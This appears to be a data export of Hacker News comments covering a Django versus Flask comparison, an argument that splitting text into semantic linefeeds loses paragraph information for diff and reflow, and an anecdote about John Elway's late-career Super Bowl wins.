It also has a large ecosystem of pluggable apps, whether contrib modules or outside the Django tree.<p>Flask is a microframework. It lets you build your website in a single file if that's what you need, or scale up to multiple files/sub-websites if your website is more complex. It doesn't have its own ORM, but it's very easy to use SQLAlchemy (the best ORM/SQL abstraction framework out there, IMHO). Its templating engine (Jinja2) is superior to Django's. On the other hand, the list of plugins available is smaller than Django's.<p>Both have very good documentation.",1350043099

4644594,comment,4642395,4642880,4,0,lutusp,,,"> I'm sure someone will come up with a regexp that can take a 'standard' text file and split the lines on full stops and commas to restore an edited readable text file to 'semantic linefeed' source, thus allowing round trip copy editing.<p>Yes to the first, no to the second. The reason is that the act of recombining lines into paragraphs makes the assumption that lines broken by single linefeeds need to be merged into a paragraph. But in text, a list of items, meant to be read as a list, is also broken by single line feeds, and <i>must not</i> be turned into a paragraph.<p>One often sees posts here by beginners that include a list of items, but the rendered version assembles the list into a (typically unreadable) paragraph. More experienced hands know to break the list up with double linefeeds to defeat the ""intelligent"" reformatting algorithm.<p>The bottom line is that a recombining algorithm cannot distinguish a list of items from a paragraph of individual lines. The act of breaking text into lines loses information irretrievably.<p>Allow me a prediction: All these conventions that break text into individual lines and then try to reassemble them, i.e. this forum, the e-mail convention, and a thousand other examples, will eventually be abandoned in favor of leaving the text alone. This will happen when people realize they're throwing away information that cannot be recovered.<p>When I wrote Apple Writer in the late 1970s, the first change I made to common practice was retain the paragraph structure people naturally used in entering text (even though the displayed text was broken into lines on word boundaries). At the time, this was a bigger departure than it is now, and it helped make my program successful. But if I had been told then that people would still be defending the practice of breaking text into individual lines 35 years later, I would have laughed out loud.",1350042639

It's a shame we can't have one optimal convention for all common text that appears naturally in paragraph form. Absent diff and similar programs, lexical units consisting of paragraphs is the obvious choice.<p>> The post proposes a single line-break after each clause or sentence ...<p>Yes, which is the convention used in e-mail and elsewhere. But it throws away formatting information that can't be recovered (see below for the reason). Wouldn't it be better to revise diff so that it presents a subset of a paragraph containing the difference text, instead of having to break up the source document just to make diff happy?<p>Obviously if the text diff processes consists of programming source files, this issue may not be important. But in the general case, text naturally consists of paragraphs, not sentences, and to change text to make diff happy puts the cart before the horse.<p>The problem with recombining broken text is never more obvious than the case of a paragraph, broken into lines that will need to be merged, followed by a list of items meant to appear as individual lines, that should not be merged.

Yes, in many cases people will give the desperate a wide berth.  Sometimes, that is just the opening they need.<p>During John Elway's heyday, I saw the Denver Broncos reach the Super Bowl three times.  He was an unbelievable talent.  I saw ""the drive"" of NFL lore from my living room and I saw the Broncos lose in the Super Bowl to larger city teams all three times.  And then, years later when both he and the team had been in decline, I saw the most desperate thing.<p>After his career should have been over, when he was pushing 40, Elway and the Broncos made it back to the Super Bowl.  He played the game of his life.  And I'll be damned if there wasn't a steely look of desperation in him.  At long last, they won.  And the next year, they did it again.  In his final game, with the clock of not only the game, but of his <i>life ticking</i> down, he did something insane.  As a comparatively fragile quarterback hellbent on securing his legacy, he <i>ran</i> it in for a touchdown against heavily muscled men who had a 100 pounds in him.  And it was just desperate enough that they didn't see it coming until it was too late to stop him.<p>That's something that younger, less desperate quarterbacks just wouldn't do.  In many cases, the result is ruin.  But sometimes desperate actions prevail.  It's called a Hail Mary.<p><a href=""http://www.youtube.com/watch?v=bzzfbflCGwg&t=4m25s"" rel=""nofollow"">http://www.youtube.com/watch?v=bzzfbflCGwg&t=4m25s</a>",1350040775
